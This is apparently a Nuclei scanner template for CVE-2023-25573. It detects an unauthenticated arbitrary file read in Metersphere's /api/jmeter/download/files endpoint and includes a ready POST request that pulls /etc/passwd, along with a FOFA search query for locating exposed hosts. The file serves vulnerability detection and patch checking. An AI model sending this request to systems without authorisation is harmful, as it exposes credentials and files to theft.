http:
- matchers:
  - part: body
    type: word
    words:
    - /etc/passwd
  - condition: and
    part: header
    type: word
    words:
    - filename="{{str}}.zip"
    - application/octet-stream
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /api/jmeter/download/files HTTP/1.1

    Content-Type: application/json


    {"reportId":"{{str}}","bodyFiles":[{"id":"{{rand}}","name":"/etc/passwd"}]}

    '
id: CVE-2023-25573
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:metersphere:metersphere:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-25573
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-862
    epss-percentile: 0.8973
    epss-score: 0.02887
  description: 'Metersphere is an open source continuous testing platform. In affected
    versions an improper access control vulnerability exists in `/api/jmeter/download/files`,
    which allows any user to download any file without authentication. This issue
    may expose all files available to the running process. This issue has been addressed
    in version 1.20.20 lts and 2.7.1

    '
  impact: 'This vulnerability can lead to unauthorized access to sensitive information,
    such as configuration files, credentials, and other sensitive data.

    '
  metadata:
    fofa-query: body="Metersphere"
    max-request: 1
    product: metersphere
    vendor: metersphere
    verified: true
  name: Metersphere - Arbitrary File Read
  reference:
  - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Metersphere%20file%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2023-25573.md
  - https://nvd.nist.gov/vuln/detail/CVE-2023-25573
  - https://github.com/metersphere/metersphere/security/advisories/GHSA-mcwr-j9vm-5g8h
  remediation: Users are advised to upgrade. There are no known workarounds for this
    vulnerability.
  severity: high
  tags: cve,cve2023,metersphere,lfi
variables:
  rand: '{{rand_base(3)}}'
  str: '{{rand_base(4)}}'
